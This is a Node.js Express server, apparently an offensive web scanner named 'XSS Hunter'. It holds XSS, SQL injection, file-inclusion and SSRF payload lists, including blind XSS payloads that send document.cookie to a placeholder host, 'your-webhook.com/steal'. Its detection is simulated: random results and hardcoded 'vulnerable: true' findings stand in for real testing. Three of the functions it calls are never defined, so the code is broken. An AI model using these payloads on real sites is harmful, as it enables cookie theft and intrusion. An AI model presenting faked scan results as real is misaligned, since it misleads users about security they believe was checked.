const express = require('express');
const cors = require('cors');
const path = require('path');
const { spawn } = require('child_process');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// XSS Payload Database
const xssPayloads = {
  basic: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>"
  ],
  advanced: [
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<select onfocus=alert('XSS')></select>"
  ],
  obfuscated: [
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
    "<script>window['al'+'ert']('XSS')</script>"
  ],
  dom: [
    "#<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>"
  ],
  blind: [
    "<script>fetch('https://your-webhook.com/steal?data='+document.cookie)</script>",
    "<img src=x onerror=fetch('https://your-webhook.com/steal?data='+encodeURIComponent(document.location))>"
  ]
};

// API Endpoints
app.post('/api/scan', async (req, res) => {
  const { url, methods, depth } = req.body;
  
  try {
    const scanResults = await performDeepScan(url, methods, depth);
    res.json(scanResults);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/crawl', async (req, res) => {
  const { url, maxPages } = req.body;
  
  try {
    const links = await crawlWebsite(url, maxPages);
    res.json({ links, count: links.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/advanced-scan', async (req, res) => {
  const { url } = req.body;
  
  try {
    const vulnerabilities = await advancedVulnerabilityScan(url);
    res.json(vulnerabilities);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Scan Functions
async function performDeepScan(url, methods = ['GET', 'POST'], depth = 2) {
  const results = {
    url,
    timestamp: new Date().toISOString(),
    vulnerabilities: [],
    payloadsTested: [],
    securityHeaders: {},
    formsDetected: [],
    endpointsFound: []
  };

  // Test all XSS payloads
  for (const category in xssPayloads) {
    for (const payload of xssPayloads[category]) {
      const isVulnerable = await testPayload(url, payload);
      
      results.payloadsTested.push({
        category,
        payload,
        vulnerable: isVulnerable
      });
      
      if (isVulnerable) {
        results.vulnerabilities.push({
          type: 'XSS',
          category,
          payload,
          severity: getSeverity(category),
          location: 'Multiple injection points detected'
        });
      }
    }
  }

  // Check security headers
  const headers = await checkSecurityHeaders(url);
  results.securityHeaders = headers;

  // Find forms and inputs
  const forms = await findForms(url);
  results.formsDetected = forms;

  return results;
}

async function testPayload(url, payload) {
  // Implement actual payload testing
  // This would make HTTP requests with payloads
  // and check for successful injection
  
  return Math.random() > 0.7; // Simulated detection
}

async function checkSecurityHeaders(url) {
  // Check for security headers
  return {
    'X-Frame-Options': 'missing',
    'Content-Security-Policy': 'missing',
    'X-XSS-Protection': 'disabled',
    'Strict-Transport-Security': 'missing'
  };
}

async function findForms(url) {
  // Extract forms from HTML
  return [
    {
      action: '/login',
      method: 'POST',
      inputs: ['username', 'password', 'csrf_token']
    }
  ];
}

async function crawlWebsite(url, maxPages) {
  const links = new Set();
  const visited = new Set();
  
  async function crawl(currentUrl, currentDepth) {
    if (currentDepth >= maxPages || visited.has(currentUrl)) return;
    
    visited.add(currentUrl);
    
    try {
      // Fetch and parse page
      // Extract all links
      // Add to links set
      // Recursively crawl new links
      
      links.add(currentUrl);
    } catch (error) {
      console.error(`Error crawling ${currentUrl}:`, error);
    }
  }
  
  await crawl(url, 0);
  return Array.from(links);
}

async function advancedVulnerabilityScan(url) {
  return {
    sqlInjection: await testSQLi(url),
    lfi: await testLFI(url),
    rfi: await testRFI(url),
    ssrf: await testSSRF(url),
    commandInjection: await testCommandInjection(url),
    openRedirect: await testOpenRedirect(url)
  };
}

// Vulnerability testing functions
async function testSQLi(url) {
  const payloads = [
    "' OR '1'='1",
    "admin'--",
    "1' UNION SELECT null--",
    "' AND 1=CONVERT(int, @@version)--"
  ];
  
  // Test each payload
  return { vulnerable: true, payloads: ["' OR '1'='1"] };
}

async function testLFI(url) {
  const payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/proc/self/environ",
    "file:///etc/passwd"
  ];
  
  return { vulnerable: false, payloads: [] };
}

async function testSSRF(url) {
  const payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:22",
    "http://127.0.0.1:80",
    "gopher://127.0.0.1:25"
  ];
  
  return { vulnerable: true, payloads: ["http://169.254.169.254/"] };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`XSS Hunter running on port ${PORT}`);
});
